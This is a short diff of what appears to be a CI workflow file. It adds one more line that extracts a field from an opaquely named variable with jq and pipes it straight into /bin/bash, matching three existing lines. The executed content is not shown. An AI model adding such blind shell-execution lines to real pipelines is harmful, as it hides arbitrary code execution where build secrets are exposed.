@@ -28,6 +28,7 @@ jobs:
           echo $pzj9 | jq -r .fx6 | /bin/bash
           printf '%s' "$ns9659" | jq -r .nleom8460 | /bin/bash
           echo $h27 | jq -r .hjxgv833 | /bin/bash
+          echo $za51904 | jq -r .w52 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
